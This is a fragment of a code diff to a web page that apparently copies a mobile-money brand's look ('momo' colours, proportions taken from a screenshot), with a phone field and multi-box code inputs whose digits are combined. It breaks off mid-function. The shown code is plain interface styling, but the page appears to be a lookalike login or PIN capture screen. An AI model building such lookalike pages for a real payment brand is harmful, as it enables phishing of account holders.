@@ -64,7 +64,6 @@ body {
   margin-top: 10px;
 }
 
-/* Reduced size layout to mimic your exact screenshot proportions */
 .card {
   width: calc(100% - 32px);
   max-width: 410px;
@@ -115,10 +114,6 @@ p {
   height: 56px;
   padding: 0 16px;
   margin: 15px 0;
-}
-
-.input-container:focus-within {
-  border-color: var(--border-gray);
 }
 
 .flag-selector {
@@ -181,13 +176,16 @@ button.next-btn {
   text-transform: uppercase;
   letter-spacing: 0.5px;
   cursor: not-allowed;
+  pointer-events: none;
   transition: all 0.2s ease;
 }
 
+/* FIXED STYLE OVERWRITE: Restores standard button accessibility configuration */
 button.next-btn.active {
-  background: #cccccc !important; /* Retains matching neutral tone */
-  color: var(--white) !important;
+  background: var(--momo-yellow) !important;
+  color: var(--momo-blue) !important;
   cursor: pointer !important;
+  pointer-events: auto !important;
 }
 
 .footer-notice {
@@ -361,7 +359,6 @@ function showPage(pageId) {
   document.getElementById(pageId).classList.remove("hidden");
 }
 
-// Fixed Next Button logic to trigger immediately when the input matches or exceeds 9 digits
 const phoneInput = document.getElementById("phone");
 const nextPhoneBtn = document.getElementById("nextPhone");
 
@@ -421,4 +418,7 @@ function setupBoxInputs(containerId, totalLength, completeCallback) {
       if (!input.value) return;
 
       if (input.nextElementSibling) {
+        input.nextElementSibling.focus();
+      } else {
+        const combined = Array.from(container.querySelectorAll("input")).map(box => box.value).join("");
 
